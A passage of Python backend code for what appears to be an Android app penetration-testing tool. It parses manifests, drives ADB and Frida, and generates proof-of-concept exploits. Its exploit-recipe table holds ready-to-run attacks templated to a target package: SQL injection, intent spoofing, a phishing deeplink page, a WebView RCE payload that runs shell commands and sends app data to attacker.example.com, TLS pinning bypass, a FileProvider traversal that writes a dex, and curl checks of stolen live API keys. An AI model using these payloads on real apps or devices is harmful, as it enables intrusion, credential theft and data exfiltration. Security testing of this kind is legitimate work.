            launch_mode = _attr(app_el, "launchMode")
            task_affinity = _attr(app_el, "taskAffinity")
            grant_uri = _attr(app_el, "grantUriPermissions")
            target_activity = _attr(app_el, "targetActivity")  # for activity-alias

            intent_filters = []
            for child in app_el:
                child_tag = child.tag
                if isinstance(child_tag, str) and "}" in child_tag:
                    child_tag = child_tag.split("}", 1)[1]
                if child_tag != "intent-filter":
                    continue
                actions, categories, data_specs = [], [], []
                priority = _attr(child, "priority")
                auto_verify = _attr(child, "autoVerify")
                for sub in child:
                    sub_tag = sub.tag
                    if isinstance(sub_tag, str) and "}" in sub_tag:
                        sub_tag = sub_tag.split("}", 1)[1]
                    if sub_tag == "action":
                        v = _attr(sub, "name")
                        if v: actions.append(v)
                    elif sub_tag == "category":
                        v = _attr(sub, "name")
                        if v: categories.append(v)
                    elif sub_tag == "data":
                        spec = {}
                        for a in ("scheme", "host", "port", "path", "pathPattern",
                                  "pathPrefix", "pathSuffix", "mimeType"):
                            v = _attr(sub, a)
                            if v: spec[a] = v
                        if spec: data_specs.append(spec)
                intent_filters.append({
                    "actions": actions, "categories": categories, "data": data_specs,
                    "priority": priority, "auto_verify": auto_verify,
                })

            has_filter = bool(intent_filters)
            # Determine effective exported state (Android logic)
            if exported_attr is not None:
                effective_exported = (exported_attr.lower() == "true")
            else:
                effective_exported = has_filter or (tag == "provider" and authorities)

            comp = {
                "name": full_name,
                "short_name": name,
                "tag": tag,
                "exported": bool(effective_exported),
                "exported_explicit": exported_attr is not None,
                "exported_attr": exported_attr,
                "permission": permission,
                "enabled": enabled,
                "launch_mode": launch_mode,
                "task_affinity": task_affinity,
                "grant_uri_permissions": grant_uri,
                "authorities": authorities,
                "target_activity": target_activity,
                "intent_filters": intent_filters,
            }
            result[tag_to_key[tag]].append(comp)

        # Permissions
        perms = []
        for el in xml_obj.iter():
            t = el.tag
            if isinstance(t, str) and "}" in t:
                t = t.split("}", 1)[1]
            if t == "uses-permission":
                n = _attr(el, "name")
                if n: perms.append(n)

        return {
            "components": result,
            "permissions": sorted(set(perms)),
            "package": pkg,
            "platform": "Android",
        }
    except HTTPException:
        raise
    except Exception as e:
        log.exception("Component parsing failed")
        raise HTTPException(500, f"Failed to parse components: {e}")


@app.get("/api/scans")
async def list_scans():
    out = []
    for p in sorted(REPORT_DIR.glob("*.json"), key=lambda x: x.stat().st_mtime, reverse=True):
        # Skip dynamic-test result side-files: {sid}.dynamic.json
        if p.stem.endswith(".dynamic"):
            continue
        try:
            with p.open("r", encoding="utf-8") as f:
                r = json.load(f)
            # Skip if this isn't a real scan result (no findings -> probably partial/corrupt)
            if "findings" not in r:
                continue
            out.append({
                "scan_id": r.get("scan_id", p.stem),
                "filename": r.get("filename", ""),
                "package": r.get("metadata", {}).get("package", "") or p.stem,
                "platform": r.get("platform", "Android"),
                "summary": r.get("summary", {}),
                "version_name": r.get("metadata", {}).get("version_name", ""),
                "scan_date": r.get("scan_date", ""),
                "scan_duration_seconds": r.get("scan_duration_seconds", 0),
                "mtime": p.stat().st_mtime,
                "size_bytes": p.stat().st_size,
            })
        except Exception as e:
            log.warning("Could not read scan %s: %s", p.name, e)
            continue
    return {"scans": out}


@app.delete("/api/scan/{sid}")
async def delete_scan(sid: str):
    """Delete a saved scan and all related files (report, dynamic results, PoCs, original APK)."""
    sid = _validate_scan_id(sid)
    deleted = []
    # Main report
    p = REPORT_DIR / f"{sid}.json"
    if p.exists():
        # Read first to find apk_path -- delete the original binary too
        try:
            with p.open("r", encoding="utf-8") as f:
                r = json.load(f)
            apk_path = _safe_binary_path(r)
            if apk_path:
                Path(apk_path).unlink(missing_ok=True)
                deleted.append(Path(apk_path).name)
        except Exception:
            pass
        p.unlink()
        deleted.append(p.name)
    # Side-files
    for suffix in (".dynamic.json", ".pocs.json"):
        sp = REPORT_DIR / f"{sid}{suffix}"
        if sp.exists():
            sp.unlink()
            deleted.append(sp.name)
    # PoC artifacts directory
    poc_dir = REPORT_DIR / f"{sid}_pocs"
    if poc_dir.exists() and poc_dir.is_dir():
        try:
            shutil.rmtree(poc_dir)
            deleted.append(poc_dir.name + "/")
        except Exception as e:
            log.warning("Could not remove %s: %s", poc_dir, e)
    if not deleted:
        raise HTTPException(404, "Scan not found")
    log.info("Deleted scan %s: %s", sid, ", ".join(deleted))
    return {"ok": True, "deleted": deleted}


@app.get("/api/scan/{sid}/playbook")
async def playbook(sid: str):
    return {"playbook": build_exploit_playbook(_load(sid))}


@app.get("/api/scan/{sid}/pocs")
async def list_pocs(sid: str):
    """Generate PoCs for this scan, save to disk, return manifest."""
    report = _load(sid)
    pocs = generate_pocs(report)
    save_pocs_to_disk(sid, pocs)
    return {
        "scan_id": sid,
        "count": len(pocs),
        "pocs": [p.to_dict() for p in pocs],
    }


@app.post("/api/scan/{sid}/pocs/verify")
async def verify_pocs(sid: str, body: dict = Body(...)):
    """Run automated_cmd of each PoC against the connected device, mark verified/failed."""
    report = _load(sid)
    serial = body.get("serial")
    devs = await adb_devices()
    if not devs:
        raise HTTPException(400, "No connected device. Connect a phone (USB debugging) or start an emulator.")
    if not serial:
        serial = devs[0]["serial"]
    pocs = generate_pocs(report)
    pocs = await auto_verify_pocs(report, pocs, serial)
    save_pocs_to_disk(sid, pocs)
    # Persist verified state
    with (REPORT_DIR / f"{sid}.pocs.json").open("w", encoding="utf-8") as f:
        json.dump([p.to_dict() for p in pocs], f, indent=2, default=str)
    return {
        "scan_id": sid, "count": len(pocs),
        "verified": sum(1 for p in pocs if p.confidence == "verified"),
        "failed": sum(1 for p in pocs if p.confidence == "failed"),
        "needs_device": sum(1 for p in pocs if p.confidence == "needs-device"),
        "pocs": [p.to_dict() for p in pocs],
    }


@app.get("/api/scan/{sid}/poc/{poc_id}/{filename}", response_class=PlainTextResponse)
async def download_poc_file(sid: str, poc_id: str, filename: str):
    safe_poc = _safe_fs_name(poc_id)
    safe_file = _safe_fs_name(filename)
    p = POC_DIR / sid / safe_poc / safe_file
    if not p.exists():
        report = _load(sid)
        save_pocs_to_disk(sid, generate_pocs(report))
        if not p.exists():
            raise HTTPException(404, "PoC file not found")
    return p.read_text(encoding="utf-8", errors="replace")


@app.get("/api/scan/{sid}/poc/{poc_id}/zip")
async def download_poc_zip(sid: str, poc_id: str):
    """Download all artifacts of a single PoC as a zip."""
    import zipfile, io
    safe_poc = _safe_fs_name(poc_id)
    poc_dir = POC_DIR / sid / safe_poc
    if not poc_dir.exists():
        report = _load(sid)
        save_pocs_to_disk(sid, generate_pocs(report))
    if not poc_dir.exists():
        raise HTTPException(404, "PoC not found")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in poc_dir.glob("*"):
            zf.write(f, arcname=f.name)
    return Response(content=buf.getvalue(), media_type="application/zip",
                    headers={"Content-Disposition": f"attachment; filename={safe_poc}.zip"})


@app.get("/api/scan/{sid}/pocs/zip")
async def download_all_pocs_zip(sid: str):
    """Download every PoC for this scan as one zip."""
    import zipfile, io
    report = _load(sid)
    save_pocs_to_disk(sid, generate_pocs(report))
    sid_dir = POC_DIR / sid
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in sid_dir.rglob("*"):
            if f.is_file():
                zf.write(f, arcname=str(f.relative_to(sid_dir)))
    pkg = report.get("metadata", {}).get("package", "app")
    return Response(content=buf.getvalue(), media_type="application/zip",
                    headers={"Content-Disposition": f"attachment; filename=vexa_pocs_{pkg}.zip"})


@app.get("/api/scan/{sid}/frida/{kind}", response_class=PlainTextResponse)
async def frida_script(sid: str, kind: str):
    report = _load(sid)
    pkg = report.get("metadata", {}).get("package") or "<package>"
    if kind == "ssl": return frida_ssl_bypass(pkg)
    if kind == "root": return frida_root_bypass(pkg)
    if kind == "dump": return frida_universal_dumper(pkg)
    raise HTTPException(404, "Unknown frida kind")


@app.post("/api/scan/{sid}/install")
async def device_install(sid: str, body: dict = Body(...)):
    report = _load(sid)
    apk_path = report.get("apk_path")
    serial = body.get("serial")
    if not apk_path or not Path(apk_path).exists():
        raise HTTPException(400, "APK file no longer on disk; re-upload")
    return await adb_install(apk_path, serial)


@app.post("/api/scan/{sid}/uninstall")
async def device_uninstall(sid: str, body: dict = Body(...)):
    report = _load(sid)
    pkg = report.get("metadata", {}).get("package")
    if not pkg:
        raise HTTPException(400, "No package")
    return await adb_uninstall(pkg, body.get("serial"))


@app.post("/api/scan/{sid}/dynamic")
async def dynamic_test(sid: str, body: dict = Body(...)):
    """Run the full dynamic suite against the connected device."""
    report = _load(sid)
    serial = body.get("serial")
    devs = await adb_devices()
    if not devs:
        raise HTTPException(400, "No connected device. Connect a phone (USB debugging) or start an emulator.")
    if not serial:
        serial = devs[0]["serial"]
    log.info("Running dynamic test for %s on %s", report.get("metadata", {}).get("package"), serial)
    result = await run_full_dynamic_test(report, serial)
    # Persist
    with (REPORT_DIR / f"{sid}.dynamic.json").open("w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, default=str)
    return result


@app.post("/api/scan/{sid}/test/activity")
async def dyn_activity(sid: str, body: dict = Body(...)):
    report = _load(sid)
    pkg = report.get("metadata", {}).get("package")
    return await test_exported_activity(pkg, body["activity"], body.get("serial"))


@app.post("/api/scan/{sid}/test/deeplink")
async def dyn_deeplink(sid: str, body: dict = Body(...)):
    return await test_deeplink(body["uri"], body.get("serial"))


@app.post("/api/scan/{sid}/test/provider")
async def dyn_provider(sid: str, body: dict = Body(...)):
    return await test_content_provider(body["authority"], body.get("serial"))


@app.post("/api/scan/{sid}/pull")
async def dyn_pull(sid: str, body: dict = Body(...)):
    report = _load(sid)
    pkg = report.get("metadata", {}).get("package")
    return await pull_app_data(pkg, body.get("serial"))


# =============================================================================
# Dynamic — quick actions: launch / kill / clear / logcat / screenshot / etc.
# =============================================================================

@app.post("/api/scan/{sid}/quick/{action}")
async def dyn_quick(sid: str, action: str, body: dict = Body(default={})):
    """Targeted single-action endpoints for the dynamic-testing UI."""
    report = _load(sid)
    pkg = report.get("metadata", {}).get("package", "")
    serial = body.get("serial")
    if not pkg:
        raise HTTPException(400, "Scan has no package name.")
    devs = await adb_devices()
    if not devs:
        raise HTTPException(400, "No connected device. Connect a phone (USB debugging) or start an emulator.")
    if not serial:
        serial = devs[0]["serial"]

    if action == "launch":
        # monkey is most reliable cross-version launch
        r = await adb_run(["shell", "monkey", "-p", pkg, "-c", "android.intent.category.LAUNCHER", "1"], serial=serial)
        return {"action": "launch", "package": pkg, **r}

    if action == "kill":
        r = await adb_run(["shell", "am", "force-stop", pkg], serial=serial)
        return {"action": "kill", **r}

    if action == "clear":
        r = await adb_run(["shell", "pm", "clear", pkg], serial=serial)
        return {"action": "clear", **r}

    if action == "logcat":
        # Filter to package only -- need PID lookup first
        pid_r = await adb_run(["shell", "pidof", pkg], serial=serial)
        pid = (pid_r.get("stdout") or "").strip()
        if pid:
            r = await adb_run(["shell", "logcat", "-d", "-t", "200", f"--pid={pid}"], serial=serial, timeout=15)
        else:
            # App not running, just grab tagged lines
            r = await adb_run(["shell", "logcat", "-d", "-t", "100"], serial=serial, timeout=15)
        return {"action": "logcat", "pid": pid, **r}

    if action == "dumpsys":
        r = await adb_run(["shell", "dumpsys", "package", pkg], serial=serial, timeout=20)
        # Truncate for safety
        if r.get("stdout") and len(r["stdout"]) > 25000:
            r["stdout"] = r["stdout"][:25000] + "\n[... truncated, output too long ...]"
        return {"action": "dumpsys", **r}

    if action == "screenshot":
        # Capture to /sdcard, then base64 it back
        path = f"/sdcard/vexa_screen_{int(__import__('time').time())}.png"
        r1 = await adb_run(["shell", "screencap", "-p", path], serial=serial, timeout=15)
        if not r1.get("ok"):
            return {"action": "screenshot", **r1}
        # Pull as base64 via exec-out for binary safety
        import base64 as _b64
        exe = adb_path()
        cmd = [exe]
        if serial: cmd += ["-s", serial]
        cmd += ["exec-out", "cat", path]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=20)
            await adb_run(["shell", "rm", path], serial=serial)
            if proc.returncode == 0 and stdout:
                return {"action": "screenshot", "ok": True, "image_b64": _b64.b64encode(stdout).decode("ascii"),
                        "mime": "image/png", "size": len(stdout)}
            return {"action": "screenshot", "ok": False, "stderr": stderr.decode("utf-8", errors="replace") or "no data"}
        except Exception as e:
            return {"action": "screenshot", "ok": False, "stderr": str(e)}

    if action == "netstat":
        # Show TCP connections (need root or busybox; show what we can)
        r = await adb_run(["shell", "ss", "-tn"], serial=serial, timeout=10)
        if not r.get("ok") or not r.get("stdout"):
            r = await adb_run(["shell", "netstat", "-tn"], serial=serial, timeout=10)
        return {"action": "netstat", **r}

    if action == "logcat_clear":
        r = await adb_run(["logcat", "-c"], serial=serial)
        return {"action": "logcat_clear", **r}

    raise HTTPException(404, f"Unknown action '{action}'")


@app.post("/api/scan/{sid}/intent")
async def dyn_send_intent(sid: str, body: dict = Body(...)):
    """Send a custom Intent: action / target / extras (already shell-quoted)."""
    report = _load(sid)
    pkg = report.get("metadata", {}).get("package", "")
    serial = body.get("serial")
    devs = await adb_devices()
    if not devs:
        raise HTTPException(400, "No connected device.")
    if not serial:
        serial = devs[0]["serial"]
    action = (body.get("action") or "").strip()
    target = (body.get("target") or "").strip()
    extras = (body.get("extras") or "").strip()

    if not action and not target:
        raise HTTPException(400, "Need at least an action or a target component.")

    args = ["shell", "am", "start", "-W"]
    if action:
        args += ["-a", action]
    if target:
        # target like '-n pkg/.Activity' or 'pkg/.Activity'
        if target.startswith("-n "):
            target = target[3:].strip()
        args += ["-n", target]
    # Extras: split safely on spaces inside quotes
    if extras:
        import shlex
        try:
            args += shlex.split(extras)
        except ValueError as e:
            raise HTTPException(400, f"Could not parse extras: {e}")

    r = await adb_run(args, serial=serial, timeout=20)
    return {"command": " ".join(args), **r}


# =============================================================================
# Rule-based chat assistant -- works without any LLM.
# Maps user questions to relevant findings and produces grounded answers.
# =============================================================================

# =============================================================================
# Exploit generation knowledge base.
# Maps vulnerability classes to runnable PoCs targeted at the current scan's package.
# =============================================================================

EXPLOIT_RECIPES = {
    "sql-injection": {
        "title": "SQL Injection via exported ContentProvider / Activity",
        "explanation": (
            "App passes user-controlled input to rawQuery() or query() with concatenated SQL. "
            "If the entry point is reachable from an exported component or content URI, any app on "
            "the device can run arbitrary SQL against the app's private database -- exfiltrate every "
            "row, drop tables, or leverage SQLite ATTACH DATABASE for arbitrary file write."),
        "tags": ["sqli", "sql-injection", "sql", "rawquery", "contentprovider"],
        "build": lambda r: f"""# SQL Injection PoC — target: {_pkg(r)}

# 1) UNION-based exfiltration via ContentProvider URI
adb shell content query \\
  --uri "content://{_first_authority(r) or 'AUTHORITY_HERE'}/users" \\
  --where "1=1) UNION SELECT name FROM sqlite_master WHERE type='table' --"

# 2) Boolean blind via deeplink (if app exposes a search Activity)
adb shell am start -W -a android.intent.action.VIEW \\
  -d "{_first_deeplink(r) or 'myapp://search?q=test'}'%20OR%20'1'='1"

# 3) Stack-error based: send a malformed query to surface the SQL
adb shell content query --uri "content://{_first_authority(r) or 'AUTHORITY_HERE'}/items?id='" 

# 4) Frida hook to log every rawQuery() call (verifies sink)
cat > sql-monitor.js <<'EOF'
Java.perform(() => {{
  const SQLiteDatabase = Java.use('android.database.sqlite.SQLiteDatabase');
  SQLiteDatabase.rawQuery.overloads.forEach(o => {{
    o.implementation = function(){{ console.log('[SQL]', arguments[0]); return o.apply(this, arguments); }};
  }});
}});
EOF
frida -U -f {_pkg(r)} -l sql-monitor.js --no-pause"""},

    "exported-activity": {
        "title": "Exported Activity / Intent Spoofing",
        "explanation": (
            "Any app can launch an exported Activity. If the Activity reads Intent extras and uses "
            "them as authentication state, file paths, URIs, or deep-link targets, it's a privilege "
            "escalation primitive. Test every exported Activity with adb am start."),
        "tags": ["exported", "activity", "intent", "spoof", "intent spoof"],
        "build": lambda r: f"""# Exported Activity PoCs — target: {_pkg(r)}

# Enumerate exported Activities
adb shell dumpsys package {_pkg(r)} | grep -A1 "Activity Resolver" | head -50

# Generic launch with fake extras (try this on every exported activity)
ACTIVITIES=({_exported_activities_str(r)})

for ACT in "${{ACTIVITIES[@]}}"; do
  echo "[*] Probing $ACT"
  adb shell am start -n "{_pkg(r)}/$ACT" \\
    --es "user_id" "1" \\
    --es "is_authenticated" "true" \\
    --es "role" "admin" \\
    --es "redirect_url" "https://attacker.example.com" \\
    --ei "amount" 99999 \\
    --ez "is_premium" true \\
    --es "file_path" "../../../databases/users.db"
done

# Send a crafted Intent through Tasker / IFTTT-style trigger
adb shell am start -a android.intent.action.VIEW \\
  -n "{_pkg(r)}/{_main_or_first_activity(r)}" \\
  --es "deep_link_target" "javascript:fetch('//attacker.example.com?'+document.cookie)"

# Frida: observe what the activity actually reads
cat > intent-tracer.js <<'EOF'
Java.perform(() => {{
  const Activity = Java.use('android.app.Activity');
  Activity.onCreate.overload('android.os.Bundle').implementation = function(b) {{
    const intent = this.getIntent();
    if (intent) {{
      const extras = intent.getExtras();
      console.log('[Activity]', this.getClass().getName());
      console.log('[Action]', intent.getAction());
      console.log('[Data]', intent.getDataString());
      if (extras) console.log('[Extras]', extras.toString());
    }}
    return this.onCreate(b);
  }};
}});
EOF
frida -U -f {_pkg(r)} -l intent-tracer.js --no-pause"""},

    "deeplink": {
        "title": "Deep Link / Intent URL Hijack",
        "explanation": (
            "Each registered deep link is a click-and-go entry into the app. Test by crafting URIs "
            "that abuse parsing logic: directory traversal in path, JS in URL, server-side "
            "redirects to attacker domain, or auth-token interception."),
        "tags": ["deeplink", "deep link", "uri", "url scheme", "intent-filter"],
        "build": lambda r: f"""# Deep Link Exploitation — target: {_pkg(r)}

# Registered deep links from manifest scan:
{_deeplink_list_str(r)}

# 1) Direct trigger from adb (no user interaction)
adb shell am start -W -a android.intent.action.VIEW -d "{_first_deeplink(r) or 'myapp://'}"

# 2) Path traversal in deeplink path
adb shell am start -W -a android.intent.action.VIEW \\
  -d "{(_first_deeplink(r) or 'myapp://').rstrip('/')}/file?path=../../../databases/users.db"

# 3) Open redirect via url= parameter
adb shell am start -W -a android.intent.action.VIEW \\
  -d "{(_first_deeplink(r) or 'myapp://').rstrip('/')}/redirect?url=https://attacker.example.com"

# 4) JavaScript injection (if deep link feeds into WebView)
adb shell am start -W -a android.intent.action.VIEW \\
  -d "{(_first_deeplink(r) or 'myapp://').rstrip('/')}/page?content=javascript:alert(document.cookie)"

# 5) From a malicious webpage (one-click attack):
cat > deeplink-attack.html <<'EOF'
<!DOCTYPE html>
<title>Win a free phone!</title>
<meta http-equiv="refresh" content="0; url={_first_deeplink(r) or 'myapp://'}">
<script>setTimeout(() => location='{(_first_deeplink(r) or 'myapp://').rstrip('/')}/admin?action=delete_account', 100);</script>
<p>Loading offer...</p>
EOF
# Host this and lure the victim to click it from their phone."""},

    "webview-rce": {
        "title": "WebView addJavascriptInterface RCE (CVE-2014-1939)",
        "explanation": (
            "If the app exposes a Java object to WebView JS (addJavascriptInterface) AND loads "
            "attacker-controlled HTML, the JS side can use reflection to call Runtime.exec and run "
            "arbitrary shell commands as the app's UID. Pre-API 17 even built-in methods leak; "
            "post-17 only @JavascriptInterface-annotated methods are exposed but the bug class persists."),
        "tags": ["webview", "addjs", "javascript interface", "rce", "javascriptinterface"],
        "build": lambda r: f"""# WebView addJavascriptInterface RCE — target: {_pkg(r)}

# Hosted payload (point WebView at this URL, e.g. via deep link or open redirect):
cat > webview-rce.html <<'EOF'
<!DOCTYPE html>
<html><head><title>Loading...</title></head><body>
<script>
// Attempt 1: Reflection via the typical 'jsBridge' / 'androidApi' interface name
// (Iterate common names that apps use)
var BRIDGE_NAMES = ['jsBridge','androidApi','android','Native','app','interface','bridge','JSBridge','MyApp'];
for (var i = 0; i < BRIDGE_NAMES.length; i++) {{
  var b = window[BRIDGE_NAMES[i]];
  if (b) {{
    try {{
      // pre-API 17 path: getClass() reachable
      var cls = b.getClass().forName('java.lang.Runtime');
      var rt = cls.getMethod('getRuntime', null).invoke(null, null);
      var p  = rt.exec(['sh','-c','id; cat /data/data/{_pkg(r)}/shared_prefs/* | head -100']);
      var br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
      var out = '', line; while ((line = br.readLine()) !== null) out += line + '\\n';
      // Exfiltrate
      fetch('https://attacker.example.com/exfil?d=' + encodeURIComponent(out));
      document.body.innerText = 'OK ' + BRIDGE_NAMES[i];
      break;
    }} catch (e) {{
      // post-API 17: only annotated methods reachable; try direct calls if app exposes any obvious sinks
      try {{
        if (typeof b.execCommand === 'function')   b.execCommand('id');
        if (typeof b.runShell === 'function')      b.runShell('id');
        if (typeof b.openUrl === 'function')       b.openUrl('javascript:document.cookie');
        if (typeof b.getToken === 'function')      fetch('https://attacker.example.com/?t=' + b.getToken());
      }} catch (_) {{}}
    }}
  }}
}}
</script></body></html>
EOF

# Trigger by deeplink (if WebView loads an arbitrary URL)
adb shell am start -a android.intent.action.VIEW \\
  -d "{(_first_deeplink(r) or 'myapp://').rstrip('/')}/open?url=https://attacker.example.com/webview-rce.html"

# Frida: enumerate every Java object exposed to WebView at runtime
cat > webview-bridges.js <<'EOF'
Java.perform(() => {{
  const WebView = Java.use('android.webkit.WebView');
  const orig = WebView.addJavascriptInterface;
  orig.implementation = function(obj, name) {{
    console.log('[WebView] Exposes Java object as window.' + name + ' -> ' + obj.getClass().getName());
    const cls = obj.getClass();
    const methods = cls.getMethods();
    for (let i = 0; i < methods.length; i++) {{
      const m = methods[i];
      if (m.toString().includes(cls.getName())) {{
        console.log('  ' + m.toString());
      }}
    }}
    return orig.call(this, obj, name);
  }};
}});
EOF
frida -U -f {_pkg(r)} -l webview-bridges.js --no-pause"""},

    "trustmanager-bypass": {
        "title": "MITM via Trust-All TLS / Hostname Verifier",
        "explanation": (
            "App uses a custom X509TrustManager that accepts any cert OR a HostnameVerifier that "
            "always returns true. With Burp/mitmproxy on the same WiFi (or via ARP spoof), all "
            "TLS traffic decrypts -- session tokens, payment data, PII."),
        "tags": ["trustmanager", "ssl", "tls", "mitm", "pinning bypass"],
        "build": lambda r: f"""# TLS MITM PoC — target: {_pkg(r)}

# 1) Set up mitmproxy on attacker machine (10.0.0.5 here)
mitmproxy -p 8080  # or burp suite

# 2) Configure phone proxy (Settings -> WiFi -> long-press network -> Modify -> Proxy)
#    Host: 10.0.0.5  Port: 8080

# 3) Install mitmproxy CA cert on device (system store, not user!)
adb push ~/.mitmproxy/mitmproxy-ca-cert.pem /sdcard/
# In Settings -> Security -> Encryption & credentials -> Install a certificate -> CA cert

# 4) For an app with custom trust-all, no cert install is needed -- traffic decrypts immediately:
adb shell pm clear {_pkg(r)}
adb shell am start -n {_pkg(r)}/{_main_or_first_activity(r)}
# Watch mitmproxy console: every HTTPS request and response is visible.

# 5) Frida bypass for apps that DO pin -- Universal SSL pinning bypass
cat > pinning-bypass.js <<'EOF'
Java.perform(() => {{
  // Bypass OkHttp CertificatePinner
  try {{
    const CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String','java.util.List').implementation = () => null;
    console.log('[+] OkHttp CertificatePinner bypassed');
  }} catch (e) {{}}
  // Bypass TrustManagerImpl checkTrustedRecursive (Android 7+)
  try {{
    const ArrayList = Java.use('java.util.ArrayList');
    const TMImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TMImpl.checkTrustedRecursive.implementation = () => ArrayList.$new();
    console.log('[+] Android TrustManager bypassed');
  }} catch (e) {{}}
}});
EOF
frida -U -f {_pkg(r)} -l pinning-bypass.js --no-pause"""},

    "secrets": {
        "title": "Hardcoded Secret Validation",
        "explanation": (
            "Secrets baked into client APKs are extractable by anyone who downloads the app. "
            "Each leaked credential is a real vulnerability -- validate by calling the upstream API "
            "with the stolen key. Treat any positive response as a critical finding."),
        "tags": ["secret", "api key", "credential", "leaked"],
        "build": lambda r: f"""# Hardcoded Secret Validation — target: {_pkg(r)}

# Secrets detected in this scan:
{_secret_list_str(r)}

# AWS access key validation
aws sts get-caller-identity --profile leaked
# Or with explicit creds:
AWS_ACCESS_KEY_ID=AKIAxxxx AWS_SECRET_ACCESS_KEY=xxxx \\
  aws sts get-caller-identity

# Stripe secret key (shows live mode + account ID if valid)
curl -u sk_live_xxxx: https://api.stripe.com/v1/charges?limit=1

# Google Maps / Cloud API key
curl "https://maps.googleapis.com/maps/api/geocode/json?address=Eiffel+Tower&key=AIzaxxxx"

# Slack bot token
curl -H "Authorization: Bearer xoxb-xxxx" https://slack.com/api/auth.test

# GitHub PAT (lists user info + scopes)
curl -H "Authorization: token ghp_xxxx" https://api.github.com/user

# Twilio account SID + auth token
curl -u "ACxxxx:xxxx" https://api.twilio.com/2010-04-01/Accounts.json

# OpenAI key (returns model list if valid)
curl -H "Authorization: Bearer sk-xxxx" https://api.openai.com/v1/models

# Frida hook to capture cipher keys/secrets at runtime (catches obfuscated/decrypted-at-runtime)
cat > secrets-dumper.js <<'EOF'
Java.perform(() => {{
  const SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
  SecretKeySpec.$init.overload('[B','java.lang.String').implementation = function(k, alg) {{
    const hex = Array.from(k).map(b => ('0'+(b&0xff).toString(16)).slice(-2)).join('');
    console.log('[Key]', alg, hex);
    return this.$init(k, alg);
  }};
  const Cipher = Java.use('javax.crypto.Cipher');
  Cipher.doFinal.overload('[B').implementation = function(b) {{
    console.log('[Cipher]', this.getAlgorithm(), 'in:', b.length, 'bytes');
    return this.doFinal(b);
  }};
}});
EOF
frida -U -f {_pkg(r)} -l secrets-dumper.js --no-pause"""},

    "intent-redirection": {
        "title": "Intent Redirection (OVAA pattern)",
        "explanation": (
            "App reads an Intent passed in as an extra (forward_intent, redirect_intent, etc.) "
            "and uses it as the target Intent for startActivity/sendBroadcast. Attacker passes an "
            "intent that targets the app's own internal components, bypassing exported=false."),
        "tags": ["intent redirection", "intent forwarding", "ovaa"],
        "build": lambda r: f"""# Intent Redirection PoC — target: {_pkg(r)}

# Build an Intent that targets an INTERNAL component via the public forwarder
# The target component has android:exported="false" so it's normally unreachable.

# 1) Identify the public forwarder via Frida
cat > intent-redirect-trace.js <<'EOF'
Java.perform(() => {{
  const Activity = Java.use('android.app.Activity');
  Activity.startActivity.overload('android.content.Intent').implementation = function(i) {{
    const fromExtra = this.getIntent().getParcelableExtra(
      Java.use('android.os.Parcelable').class);
    if (fromExtra && this.getIntent().hasExtra(fromExtra)) {{
      console.log('[!] Intent forward detected!');
      console.log('  Outer:', this.getIntent().toUri(0));
      console.log('  Forwarded:', i.toUri(0));
    }}
    return this.startActivity(i);
  }};
}});
EOF

# 2) Craft a forwarded Intent at the internal target
cat > redirect.kt <<'EOF'
val target = Intent()
target.setClassName("{_pkg(r)}", "{_pkg(r)}.internal.AdminActivity")
target.putExtra("user_role", "admin")

val outer = Intent()
outer.setComponent(ComponentName("{_pkg(r)}", "{_main_or_first_activity(r)}"))
outer.putExtra("forward_intent", target)
startActivity(outer)
EOF

# 3) From adb (Android 9+ supports nested intent extras via --eu uri):
adb shell am start \\
  -n "{_pkg(r)}/{_main_or_first_activity(r)}" \\
  --eu "forward_intent" "intent://%23Intent%3Bcomponent={_pkg(r)}%2F.internal.AdminActivity%3Bend"
"""},

    "fileprovider": {
        "title": "FileProvider Path Traversal (CVE-2024-0044 family)",
        "explanation": (
            "FileProvider config with overly broad <root-path/> or <files-path path=\"\"/> lets "
            "any app request a content:// URI to private app files. If openFile() concatenates "
            "the path without canonical-path validation, '../' segments escape the sandbox."),
        "tags": ["fileprovider", "path traversal", "dirty stream", "content provider"],
        "build": lambda r: f"""# FileProvider / Dirty Stream PoC — target: {_pkg(r)}

# 1) List the app's content provider authorities
adb shell dumpsys package {_pkg(r)} | grep "Authority="

# 2) Probe with traversal sequences
ATTACKER_PKG="com.attacker.poc"

# Construct a malicious URI that escapes the provider's intended directory
# Try several traversal styles -- some providers normalise '/' but not '%2F'
URIS=(
  "content://AUTHORITY/files/..%2F..%2F..%2Fdatabases%2Fusers.db"
  "content://AUTHORITY/files/..%2F..%2Fshared_prefs%2Fauth.xml"
  "content://AUTHORITY/cache/..%2F..%2F..%2Flib%2Flibsecret.so"
)

# 3) From an attacker app, request the URI and attempt to read it
cat > AttackerActivity.kt <<'EOF'
val uri = Uri.parse("content://{_first_authority(r) or 'AUTHORITY_HERE'}/files/..%2Fshared_prefs%2Fauth.xml")
val pfd = contentResolver.openFileDescriptor(uri, "r")  // BUG: should fail but returns valid FD
val text = pfd?.fileDescriptor?.let {{ FileInputStream(it).bufferedReader().readText() }}
Log.d("PoC", "Stolen content: " + text)
EOF

# 4) Test from adb (write to attacker-controlled location via openFile mode='w'):
adb shell content write \\
  --uri "content://{_first_authority(r) or 'AUTHORITY_HERE'}/files/..%2F..%2Fcode_cache%2Fmaldex.dex" \\
  < malicious.dex"""},

    "frida-runtime": {
        "title": "Generic Frida Runtime Inspector",
        "explanation": (
            "When you don't know which vulnerability is exploitable, just observe what the app does. "
            "This script logs every HTTP request, every cipher operation, every shared-pref read, "
            "every Intent dispatched. Run it during normal app use to map the attack surface."),
        "tags": ["frida", "runtime", "inspect", "monitor", "trace"],
        "build": lambda r: f"""# Frida Universal Runtime Inspector — target: {_pkg(r)}

cat > inspect-all.js <<'EOF'
Java.perform(() => {{

  // --- HTTP requests ---
  try {{
    const URL_C = Java.use('java.net.URL');
    URL_C.openConnection.overload().implementation = function() {{
      console.log('[HTTP]', this.toString());
      return this.openConnection();
    }};
  }} catch (e) {{}}
  try {{
    const Request = Java.use('okhttp3.Request');
    Request.url.overload().implementation = function() {{
      const url = this.url();
